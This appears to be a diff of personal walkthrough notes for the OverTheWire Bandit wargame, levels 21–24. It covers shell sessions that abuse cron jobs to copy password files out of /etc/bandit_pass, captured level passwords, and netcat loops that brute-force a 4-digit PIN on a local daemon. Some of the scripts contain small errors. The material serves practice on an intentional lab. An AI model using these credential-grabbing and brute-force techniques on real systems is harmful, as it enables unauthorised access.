@@ -343,12 +343,153 @@ password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
 
 
+# set shell
+SHELL = /bin/bash
+
+30 3 14 8 0	echo " Test run "
+
+bandit21@melinda:~$ cd /etc/cron.d/
+bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@melinda:/etc/cron.d$ /usr/bin/cronjob_bandit22.sh 
+chmod: changing permissions of '/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv': Operation not permitted
+/usr/bin/cronjob_bandit22.sh: line 3: /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv: Permission denied
+bandit21@melinda:/etc/cron.d$ cd /tmp/
+bandit21@melinda:/tmp$ ls /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@melinda:/tmp$ ls /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv -l
+-rw-r--r-- 1 bandit22 bandit22 33 Aug 14 03:58 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@melinda:/tmp$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+--------------------------------------------------------------------------------------------------------------------
+level 22
+ssh bandit22@bandit.labs.overthewire.org
+password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+bandit22@melinda:/etc/cron.d$ cat cronjob_bandit23
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+
+bandit22@melinda:/tmp$ cat /usr/bin/cronjob_bandit23.sh    
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@melinda:/tmp$ $(echo I am user hellp | md5sum | cut -d ' ' -f 1)
+-bash: e021edf0ac54b6c420e3d0cf4d611def: command not found
+bandit22@melinda:/tmp$ $(echo I am user helli | md5sum | cut -d ' ' -f 1)
+-bash: 9e3d20c671739f42ab461d1d826a983f: command not found
+bandit22@melinda:/tmp$ $(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+-bash: 8ca319486bfbbc3663ea0fbe81326349: command not found
+bandit22@melinda:/tmp$ ls 8ca319486bfbbc3663ea0fbe81326349
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@melinda:/tmp$ ls 8ca319486bfbbc3663ea0fbe81326349 -l
+-rw-rw-r-- 1 bandit23 bandit23 33 Aug 14 04:35 8ca319486bfbbc3663ea0fbe81326349
+bandit22@melinda:/tmp$ cat 8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+
+/tmp/8169b67bd894ddbb4412f91573b38db3
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+
+--------------------------------------------------------------------------------------------------------------------
+level 23
+ssh bandit23@bandit.labs.overthewire.org
+password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+
+bandit23@melinda:~$ cd /etc/cron.d/
+bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@melinda:/etc/cron.d$ ls -l /usr/bin/cronjob_bandit24
+ls: cannot access /usr/bin/cronjob_bandit24: No such file or directory
+bandit23@melinda:/etc/cron.d$ ls -l /usr/bin/cronjob_bandit24.sh
+-rwxr-x--- 1 bandit24 bandit23 257 May  3 12:32 /usr/bin/cronjob_bandit24.sh
+bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh 
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 "./$i"
+	rm -f "./$i"
+    fi
+done
+
+
+bandit23@melinda:/etc/cron.d$ cd /var/spool/bandit24
+bandit23@melinda:/var/spool/bandit24$ ls
+bandit23@melinda:/var/spool/bandit24$ vi getpass.sh
+#!/bin/bash
+myname = $(whoami)
+mytarget = $(echo I am user $myname | md5sum | cut -d '' -f 1)
+
+echo "copying "
+cat /etc/bandit_pass/bandit24 > /tmp/123
+
+
+bandit23@melinda:/var/spool/bandit24$ ls /tmp/123 -l
+-rw-rw-r-- 1 bandit24 bandit24 33 Aug 14 04:51 /tmp/123
+bandit23@melinda:/var/spool/bandit24$ cat /tmp/123
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+--------------------------------------------------------------------------------------------------------------------
+level 24
+ssh bandit24@bandit.labs.overthewire.org
+password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinaties, called brute-forcing.
+
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+#!/bin/bash
+for i in $(seq 87 150)
+do
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ00$i"
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ00$i" | nc localhost 30002
+done
+
+
+chmod +x crack.sh
+./crack.sh 10 87 > hey.txt
+tail -n 20 hey.txt | grep -v "Fail" | grep -v "I am" | grep -v "Exiting"
+
+
+for i in $(seq 0 9)
+do
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ000$i"
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ$i" | nc localhost 30002
+done
 
 
 
 
+for i in $(seq 100 999)
+do
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ0$i"
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ$i" | nc localhost 30002
+done
 
 
 
+for i in $(seq 1000 1010)
+do
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ$i"
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ$i" | nc localhost 30002
 
-
+done
